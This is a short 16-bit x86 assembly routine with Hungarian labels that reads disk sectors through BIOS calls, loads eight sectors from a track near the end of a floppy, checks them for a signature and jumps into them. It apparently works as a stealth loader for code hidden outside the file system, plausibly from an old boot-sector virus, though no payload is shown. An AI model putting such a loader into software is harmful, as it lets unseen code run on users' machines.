start	segment
	assume cs:start,ds:start
boot	equ	1000h
	push	ax
	push	bx
	push	cx
	push	dx
	push	es
	push	ds
	push	di
	push	si
	call	cim
cim:	pop	bx
	mov	si,5aa5h
	mov	di,55aah
	push	cs
	pop	es
ujra:	add	bx,1000
	cmp	bx,1000
	jnc	kilep1
	jmp	kilep
kilep1:	push	bx
	mov	ax,201h
	mov	dx,0
	mov	cx,1
	int	13h
	pop	bx
	jnc	tovabb
	cmp	ah,6
	jz	kilep1
	jmp	kilep
tovabb:	cmp	si,0a55ah
	jz	kilep
	mov	ax,cs
	add	ax,1000h
	push	bx
	push	ax
	int	12h
	mov	bx,64
	mul	bx
	sub	ax,1000h
	mov	bx,ax
	pop	ax
	cmp	bx,ax
	jnc	oke1
	pop	bx
	jmp	kilep
oke1:	pop	bx
oke:	mov	es,ax
	mov	ax,cs:[bx+18h]
	mov	cx,cs:[bx+1ah]
	mul	cx
	mov	cx,ax
	mov	ax,cs:[bx+13h]
	mov	dx,0
	div	cx
	sub	bx,1000
	push	bx
	mov	ch,al
	mov	cl,1
	mov	bx,100h
	mov	dx,0
	mov	ax,208h
	int	13h
	pop	bx
	jc	kilep
	push	bx
	mov	bx,100h
	mov	ax,es:[bx]
	cmp	ax,2452h
	pop	bx
	jnz	kilep
	mov	ax,bx
	add	ax,offset kilep-offset cim
	push	cs
	push	ax
	mov	ax,10ah
	push	es
	push	ax
	retf
kilep:	pop	si
	pop	di
	pop	ds
	pop	es
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	ret
cime:	dw	0
start	ends
	end